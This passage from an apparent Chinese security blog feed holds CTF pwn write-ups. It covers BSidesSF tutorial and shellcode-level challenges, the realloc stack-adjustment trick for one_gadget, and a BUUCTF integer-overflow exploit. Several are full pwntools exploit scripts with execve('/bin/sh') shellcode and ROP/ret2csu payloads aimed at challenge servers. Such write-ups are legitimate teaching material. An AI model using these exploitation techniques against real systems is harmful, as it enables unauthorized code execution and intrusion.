class="number">0xff</span></span><br><span class="line">        <span class="built_in">sum</span>=b+<span class="built_in">sum</span>*<span class="number">16</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;EIP from the calling function is 0x804940f and saved at &#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">target_stack_addr=leak_stack_addr+<span class="number">0x8</span><span class="comment">#调试一下，获取这个偏移</span></span><br><span class="line">log(<span class="string">&#x27;target_stack_addr&#x27;</span>,<span class="built_in">hex</span>(target_stack_addr))</span><br><span class="line">a=re(target_stack_addr)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">48</span>+<span class="string">&#x27;30900408&#x27;</span>+<span class="string">&#x27;c9920408&#x27;</span>+<span class="string">&#x27;00000000&#x27;</span>+a[<span class="number">2</span>:]+<span class="string">&#x27;00001000&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/3ObNElsnd1YoCfz.png" alt="image-20220605200714258" style="zoom: 33%;" /><h1>Tutorial64</h1><p>这道题和32位的思路是完全一样的，不一样的地方是执行read传参的时候要用一下ret2csu。</p><h2 id="EXP：-v2">EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;tutorial64-98df6ee7.challenges.bsidessf.net&#x27;</span>,<span class="number">6464</span>)</span><br><span class="line"><span class="comment">#debug(p,0x40129A)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        b=(a&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="built_in">sum</span>=b+<span class="built_in">sum</span>*<span class="number">16</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x40142b</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x401429</span></span><br><span class="line">gadget1_addr=<span class="number">0x401422</span></span><br><span class="line">gadget2_addr=<span class="number">0x401408</span></span><br><span class="line">jmp_addr=<span class="number">0x80492c9</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;RIP from the calling function is 0x4013c1 and saved at &#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">target_stack_addr=leak_stack_addr+<span class="number">0x80</span></span><br><span class="line">log(<span class="string">&#x27;target_stack_addr&#x27;</span>,<span class="built_in">hex</span>(target_stack_addr))</span><br><span class="line">a=re(target_stack_addr)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">56</span>+re(gadget1_addr)[<span class="number">2</span>:]</span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span><span class="comment">#rbx</span></span><br><span class="line">payload+=<span class="string">&#x27;0100000000000000&#x27;</span><span class="comment">#rbp</span></span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span><span class="comment">#rdi</span></span><br><span class="line">payload+=re(target_stack_addr)[<span class="number">2</span>:]<span class="comment">#rsi</span></span><br><span class="line">payload+=<span class="string">&#x27;0001000000000000&#x27;</span><span class="comment">#rdx</span></span><br><span class="line">payload+=re(read_got_addr)[<span class="number">2</span>:]</span><br><span class="line">payload+=<span class="string">&#x27;0814400000000000&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span>*<span class="number">7</span></span><br><span class="line">payload+=<span class="string">&#x27;9c12400000000000&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/KJP2xTnkAZNQiuC.png" alt="image-20220605201640972" style="zoom: 33%;" /><h1>shurdles1</h1><p>然后是shellcode闯关题，对于我这种萌新来说做起来还是比较有意思的。</p><p>题目就给了个ip和port，连上去直接开始闯关。</p><img src="https://s2.loli.net/2022/06/06/Uh2oY3sAGJp1rZX.png" alt="image-20220605202310129" style="zoom: 33%;" /><h2 id="第一关">第一关</h2><img src="https://s2.loli.net/2022/06/06/igHeP8r7IaNRJxc.png" alt="image-20220605202357671" style="zoom: 50%;" /><p>这个就是让你明确写法格式，照着输入即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax, rax</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>这个地方.是核心（这个.困扰我了很久很久，最后才发现这里的问题），或者输入机器码也行，不过我一直写的是汇编。</p><h2 id="第二关">第二关</h2><p><img src="../img/image-20221007194647365.png" alt="image-20221007194647365"></p><p>这一关想让你返回1，这就意味着你的rax寄存器里要是1，然后使用ret返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,1</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="第三关">第三关</h2><p><img src="../img/image-20221007194632389.png" alt="image-20221007194632389"></p><p>这次是想让返回值是2，但是不想让你使用ret指令来完成。给的提示是使用系统调用exit。查一下系统调用号，然后给rdi传参为2，rax放成60(exit的系统调用号)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,60</span><br><span class="line">mov rdi,2</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="第四关">第四关</h2><p><img src="https://s2.loli.net/2022/06/06/GwDtq9f7nXhjNsd.png" alt="image-20220605203440517"></p><p>这次想让返回值为3（can you exit with code 3)这句其实我也不知道咋翻译比较准确，反正我这勉强及格的英语水平能明白它意思，但是描述不是很清楚。</p><p>同时你不可以使用ret或者syscall指令。给的提示是让使用pop 和jmp来做到这一点。</p><p>ret指令相当于pop rip再跳转到rip。不能使用ret，就可以把这个指令拆开实现。先pop 一个寄存器，然后再jmp跳转过去，其实就等同于ret指令了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,3</span><br><span class="line">pop rdi</span><br><span class="line">jmp rdi</span><br><span class="line">.</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/wph5IjqnS7A9VJy.png" alt="image-20220605204139956" style="zoom:50%;" /><h1>shurdles2</h1><h2 id="第一关-v2">第一关</h2><img src="https://s2.loli.net/2022/06/06/Z98uboqdszTUBG7.png" alt="image-20220605204233997" style="zoom:50%;" /><p>这一关是想让地址0x12345678出崩溃，给的提示说jmp跳转到这个地址就可以让它崩溃了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,0x12345678</span><br><span class="line">jmp rax</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="第二关-v2">第二关</h2><img src="https://s2.loli.net/2022/06/06/goFt8GphHWMBiDb.png" alt="image-20220605204431458" style="zoom:50%;" /><p>这次人家不让用jmp了，想让用ret。</p><p>因为ret是pop rip，所以我们提前把这个0x12345678压到栈顶，然后ret即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x12345678</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="第三关-v2">第三关</h2><img src="https://s2.loli.net/2022/06/06/c39LyubpJG6kglx.png" alt="image-20220605204625021" style="zoom: 50%;" /><p>这一关想让你把字符串的地址保存在一个寄存器里，然后把寄存器作为返回值返回了。</p><p><strong>汇编语言中DB是定义单字节数据段的意思，编译时DB后面的数据将视为纯数据而不是指令代码</strong></p><p>按照给的提示，call会把下一条指令的地址压栈（<strong>也就是把字符串给压栈了</strong>），然后进行了近调用（去执行below里的内容），然后执行了pop rdi**（也就是把字符串的地址弹到了rdi里面）**，拿到了字符串的地址，然后将其赋值给rax，然后ret即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call below</span><br><span class="line">db &quot;BSides San Francisco&quot;,0</span><br><span class="line">below:</span><br><span class="line">pop rdi</span><br><span class="line">mov rax,rdi</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/IfwjcV6CbGMQN8n.png" alt="image-20220605205330512" style="zoom:50%;" /><h1>shurdles3</h1><h2 id="第一关-v3">第一关</h2><img src="https://s2.loli.net/2022/06/06/nqYRJirNV2seDm5.png" alt="image-20220605205852136" style="zoom:50%;" /><p>这个很简单，之前也做过了，就是要使用exit退出时的代码为123。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,60</span><br><span class="line">mov rdi,123</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="第二关-v3">第二关</h2><img src="https://s2.loli.net/2022/06/06/CF6o7kVvJp5sXDA.png" alt="image-20220605210132746" style="zoom:50%;" /><p>想系统调用write，然后将Hello,BSides!这句话打印出来并且使用exit退出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call write</span><br><span class="line">db &quot;Hello, BSides!&quot;,0 </span><br><span class="line">write:</span><br><span class="line">pop rsi</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,14</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">mov rax,60</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="第三关-v3">第三关</h2><img src="https://s2.loli.net/2022/06/06/mWKTz8U1xRbM6dq.png" alt="image-20220605210723155" style="zoom:50%;" /><p>此时来到了最后一关。</p><p>想让我们用open,read,write来读出flag并且进行退出（人家还说Be sure to exit cleanly，我这个英语渣渣认为是要用ret返回并且返回值为0）。flag位于/app/level2.yaml</p><p>那这题不就和打宝宝一样简单么。<strong>需要注意的是人家提示说open返回的这个文件描述符是随机的，并不是3，所以这里要用mov把rax里装的返回值给传过来</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call below</span><br><span class="line">db &quot;/app/level2.yaml&quot;,0</span><br><span class="line">below:</span><br><span class="line">pop rdi</span><br><span class="line">mov rax,2</span><br><span class="line">mov rsi,0</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">sub rsi,60</span><br><span class="line">push 48</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">sub rsi,60</span><br><span class="line">mov rdx,48</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">mov rax,0</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/zOueQdn7YsKtD6g.png" alt="image-20220605211437993" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用realloc函数来调整栈帧让one_gadget生效</title>
      <link href="/posts/f7fd9662.html"/>
      <url>/posts/f7fd9662.html</url>
      
        <content type="html"><![CDATA[<p>使用one_gadget的时候，必须要满足一定条件，如果所有one_gadget都没有满足条件，那么我们可以使用realloc函数来调整栈帧打one_gadget。<strong>本文以2.23的libc版本中的realloc函数举例说明使用realloc函数是如何调整栈帧打one_gadget的，但是在不同的libc版本中，realloc函数的具体汇编代码也不同，就导致了从在不同libc版本中的realloc函数的相同偏移处开始执行，最终调整的栈帧也是不同的，因此在实际的做题中，去一个一个尝试偏移会比计算出能使one_gadget生效的realloc函数偏移更快。</strong></p><h2 id="怎么看one-gadget是否满足条件？">怎么看one_gadget是否满足条件？</h2><p>下图是one_gadget的使用条件</p><p><img src="../img/2706180-20220628225909669-1798755531.png" alt=""></p><p>然后下图此时的__malloc_hook已经被修改为one_gadget了，并且此时准备执行calloc函数（这里先理解成malloc就行，利用手法是一样的），然后si单步进去（如下图）</p><p><img src="../img/2706180-20220628225923066-1597735649.png" alt=""></p><p>然后单步到这里（如下图），此时就执行了__malloc_hook中的内容，也就是将要执行我们的one_gadget</p><p><img src="../img/2706180-20220628225939650-1778459149.png" alt=""></p><p>然后我们再si进去（如下图）</p><p><img src="../img/2706180-20220628225951021-1292507958.png" alt=""></p><p>然后我们看此时的是否满足one_gadget的执行条件</p><p><img src="../img/2706180-20220628230006304-1061222448.png" alt=""></p><p>先看rax寄存器的值（如下图），发现不为0（NULL)，因此第一个one_gadget不能用</p><p><img src="../img/2706180-20220628230018106-1085476136.png" alt=""></p><p>然后看[rsp+0x30]的值(如下图)，发现也不为0(NULL)，因此第二个也不能用</p><p><img src="../img/2706180-20220628230035203-2099513409.png" alt=""></p><p>然后依次类推，发现[rsp+0x50]和[rsp+0x70]的地方也都不为0（如下图）</p><p><img src="../img/2706180-20220628230048946-428826209.png" alt=""></p><p>至此，四个one_gadget全部失效。因此我们要用realloc函数来调整栈帧，从而使one_gadget能够使用。</p><h2 id="为什么我们用realloc函数调整栈帧？">为什么我们用realloc函数调整栈帧？</h2><p>我认为原因有两个**（根本原因是第一个）**：</p><blockquote><p>第一、realloc函数存在一个__realloc_hook（执行realloc的时候会判断__realloc_hook是否为空，如果不为空，则执行__realloc_hook指向的内容），同时__realloc_hook和__malloc_hook的地址是挨着的（如下图），这就意味着我们覆写__malloc_hook的时候可以顺便控制__realloc_hook。<strong>因此我们把__malloc_hook改成__realloc_hook然后__realloc_hook写入one_gaget，最后依然可以执行one_gadget</strong></p></blockquote><p><img src="../img/2706180-20220628230103153-137562286.png" alt=""></p><blockquote><p>第二、realloc函数中有大量的push指令（如下图）（在执行__realloc_hook之前），因此我们将realloc函数的地址加上一定的偏移，就可以选择去执行一定量的push指令，从而抬高栈帧（我指的抬高栈帧是栈帧又向着低地址增长了）。这样rsp增加了之后，我们就可以控制例如rsp+0x30，让其内存值正好落在0处。</p></blockquote><p><img src="../img/2706180-20220628230122415-749325713.png" alt=""></p><h2 id="具体怎么用realloc函数调整栈帧">具体怎么用realloc函数调整栈帧</h2><p>首先看一下上面的图片，其中有6个push指令和一个sub rsp,0x38指令。<strong>这些指令都是把栈帧抬高（我说的抬高是指栈向低地址增长），然后抬高栈帧之后去执行one_gadget。(以[rsp+0x30]这个条件为例)这就意味着我们必须去[rsp+0x30]的上面(也就是低地址处)寻找0</strong> (这句话您细品)</p><p>然后将realloc函数地址加上不同的偏移，就可以执行一定数量的push和sub rsp,0x38指令(因为可以跳过一定个数的指令)。先考虑一下直接从0x846c0这个地址（先忽略PIE造成的影响）开始执行。这样到执行one_gadget之前有6个push和一个sub rsp,0x38指令，这将栈帧抬高了0x68(0x8*6+0x38),但是别忘了由于多call了一次(call了realloc函数，然后又去call one_gadget，但是原本只有一次call one_gadget)，<strong>因此多执行了一次压栈指令，所以最终直接执行realloc函数，栈帧抬高了0x70字节（就是将原本的rsp变成了rsp-0x70）</strong></p><p>如果执行realloc函数栈帧最少抬高多少呢？</p><blockquote><p>最少肯定是只抬高八字节(也就是仅仅多了一次call时执行的压栈指令)，<strong>这里我们先不考虑这种情况，假设必须要执行一次对栈操作指令，那么执行一次realloc函数最少应该抬高0x40个字节（sub rsp,0x38让rsp-0x38再加上call时的压栈指令）</strong></p></blockquote><h2 id="结论：">结论：</h2><blockquote><p><strong>当使用realloc函数调整栈帧时，我们可以将rsp增加（这个增加指的是栈向低地址增长）的范围控制在 0x40与0x70之间</strong>(如果不考虑最低0x8字节的话)，<strong>为了满足one_gadget的条件，只要rsp-0x40与rsp-0x70之间存在一个为0的内存单元，那么我们就可以控制realloc函数中push的数量来满足条件（控制的方法就是将realloc函数的地址加上偏移来跳过一定量的push指令）。</strong></p><p>以[rsp+0x30]=NULl这个条件为例，加上rsp-0x40与rsp-0x70这个范围。也就是说最后要在rsp-0x10与rsp-0x40找一块值为0成内存单元。</p></blockquote><h2 id="举例演示：">举例演示：</h2><p>现在我已经发现四个one_gadget全部失效，然后我想看看其中一个one_gadget [rsp+0x30]经过调整栈帧后能否使用，先去看rsp-0x10与rsp-0x40 这个范围是否存在值为0的内存。</p><p><img src="../img/2706180-20220628230144252-305430597.png" alt=""></p><p>这个0的地址是0x7ffc5f3b9ca0，如果将realloc函数对栈操作指令全部执行完的话，那么rsp-0x30的位置就是0x7ffc5f3b9c98，我们少执行一个push的话，那么rsp-0x30就会变成0x7ffc5f3b9ca0。因此判断出来我们写入realloc地址+2(push指令长度为2字节)就可以让one_gadget生效（因为跳过了一次push指令）</p><p>下图为realloc调整栈帧处的exp。</p><p><img src="../img/2706180-20220628230300587-674729075.png" alt=""></p><p>可以看见下图已经说明这个one_gadget已经生效，我们获取了shell</p><p><img src="../img/2706180-20220628230324633-1114978079.png" alt=""></p><h2 id="one-gadget的条件是获取shell的充分条件">one_gadget的条件是获取shell的充分条件</h2><p>如果这道题你已经掌握了上面介绍realloc调整栈帧的话，其实就已经是结束了。不过在最后我又学了一个更重要的细节。<strong>还是上面的脚本最后如果实际调一下的话，发现__malloc_hook里写realloc+1或者realloc+3或者直接写realloc地址都可以获取shell。</strong>（如下图）</p><p><img src="../img/2706180-20220628230336256-1198676526.png" alt=""></p><p>这是为什么？这是否意味着上面我们的结论有误？</p><p>探究一下便知。首先调试一下__malloc_hook里写入realloc函数的地址 这个情况。</p><p><img src="../img/2706180-20220628230347653-575952863.png" alt=""></p><p>发现[rsp+0x30]处居然不为0，但是却能成功获取shell（如下）</p><p><img src="../img/2706180-20220628230402532-554880588.png" alt=""></p><p>想解释这个原因，还要从execve函数下手。</p><p>通常我们认为获取shell就要写执行execve(“/bin/sh”,0,0)才可以，但是后两个参数真的一定要为0么？</p><p><img src="../img/2706180-20220628230420596-268174659.png" alt=""></p><p>它这段第一句的意思就是说argv是个传递新程序的字符串数组，说实话这句我理解也不是太深，但是能获取到两个信息。<strong>首先这个argv数组里面装的是指针（因为实际上是指针指向了字符数组(字符串使用字符串数组进行存储)的地址），其次这个数组要以NULL结尾，envp参数也是一样。</strong></p><p><strong>也就是说只要argv这个地方里面放了个指针并且是NULL结尾，至于指针指向的是不是字符串已经无所谓了，而此时的情况就是argv里面放了个指针，并且是NULL结尾(如下图)</strong></p><p><img src="../img/2706180-20220628230432185-381323556.png" alt=""></p><p>虽然这个指针指向的是数字1，不过依然最终也可以获取shell。</p><p>同时也可以做一个小测试,就是将argv里面放个Int类型的指针，指向整数，看看execve函数还能否获取shell。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> arg, <span class="type">char</span> **args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    p=&amp;a;</span><br><span class="line">    <span class="type">char</span> *argv[]=&#123;p,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>,argv,envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220628230451741-973872450.png" alt=""></p><p>发现是成功的又开启了一个shell。</p><blockquote><p>因此得出结论，one_gadget的生效条件是获取shell的充分条件，也就是说获取shell不一定要满足one_gadget的条件。</p></blockquote><p>为什么realloc+1和realloc+3也能获取shell呢？</p><p>通过调试发现realloc+1和realloc+3开始执行的话，执行的并不是正确的机器码**，而是机器码进行了错位。不过正好错位之后，依然是个push指令，导致了realloc+1其实和realloc的栈中情况是一样的，而realloc+3和realloc+2的栈中情况是一样的**。（如下图）</p><p><img src="../img/2706180-20220628230506076-1711403249.png" alt=""></p><p>由此可见，即使机器码错位，但push指令依然没变，仅仅变的是push后面的寄存器。所以并不改变栈帧</p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> realloc调整栈帧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_actf_2019_anotherrepeater</title>
      <link href="/posts/bd5b9d1a.html"/>
      <url>/posts/bd5b9d1a.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>通过这道题的学习与收获有：</p><p>1、考察的整数溢出和shellcode</p><p>2、分析了一下unsigned short int类型强转为short int类型的原理</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220413184747722-1984586467.png" alt=""></p><p>啥都没开，首先考虑shellcode</p><h2 id="程序分析：">程序分析：</h2><p><img src="../img/2706180-20220413184756960-1238868077.png" alt=""></p><p><img src="../img/2706180-20220413184807822-617007924.png" alt=""></p><p>程序主要逻辑很简单，先输入一个数字，判断它是否大于1024，如果大于的话则直接退出。小于的话，就让你输入字符，输入的字节数为刚才输入的数字。这个函数结束之后，开始无限循环去执行puts打印刚才输入的字符。</p><h2 id="大致思路：">大致思路：</h2><p>首先第一个点是printf给我们泄露了一个buf的地址（也就是栈地址），这里不用想，肯定是帮助我们执行shellcode而泄露的。</p><p>第二个点就是发现read输入的地方，距离返回地址有1051个字节。我们正常可输入的1024字节没法去控制返回地址。</p><p>然后开始去考虑怎么控制返回地址，我们只能去想办法绕过对1024字节的检查。发现if这里用了强转，仔细分析一下这里。发现v1原本是个unsigned short类型的，但是在进行检查的时候，是用__int16对v1进行操作之后再判断的。</p><p><img src="../img/2706180-20220413184816252-1703150849.png" alt=""></p><p>本身unsigned __int16定义的v1一定是个正数，如果输入负数的话，就会产生回绕，自己变成65535。而在判断时以__int16类型进行强转，使得&gt;左边的整体值为-1，从而绕过了检查。</p><p>绕过检查之后思路就简单很多了，因为没有NX，直接布置shellcode，由于我们是是有buf的栈地址的，因此思路就是直接布置shellcode，然后填充垃圾数据到返回地址，把返回地址装一个buf的栈地址（我们丝毫不用担心输入字节数的问题，毕竟我们可以输入65535个字节呢），此外也不需要去担心最后的无限循环执行puts，因为我们再返回main函数的时候就已经劫持了程序的执行流使其执行了shellcode。</p><h2 id="强转的过程">强转的过程</h2><p>这里简单说一下这个强转的过程，因为我感觉这个点应该去研究一下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">unsigned</span> __int16 a=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>((__int16)a&gt;<span class="number">1024</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220413184825767-1374956638.png" alt=""></p><p>这个地方直接打印了65535，就说明绕过了if的检查。为什么最后a是65535经过强转就是-1呢？</p><p>因为unsigned就代表了无符号整数，也就是最高位的0,1依然表示数字本身。而short int，则代表有符号整数，它的最高位是符号位，只能用来表示正负(1负，0正)。<strong>无符号整数转有符号整数时，如果最高位为0，则符号数等于无符号数。如果最高位为1，则将除去最高位之外剩下的所有位取反再加1，得到的就是有符号数（这步其实也就是取补码）</strong> 转换如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">65535</span> unsigned short <span class="built_in">int</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>    short <span class="built_in">int</span></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> 0001</span><br></pre></td></tr></table></figure><p>所以在if检查的时候，强转得到的-1绕过了检查，但事实上v1一直都是65535（因为它是unsigned short int类型）</p><h2 id="EXP">EXP:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26128)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx </span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Be careful. How many chars you want to reapeat?\n&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0x41b</span>+<span class="number">0x4</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(leak_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
            <tag> 整数溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_bjdctf_2020_dizzy</title>
      <link href="/posts/160e7f7d.html"/>
      <url>/posts/160e7f7d.html</url>
      
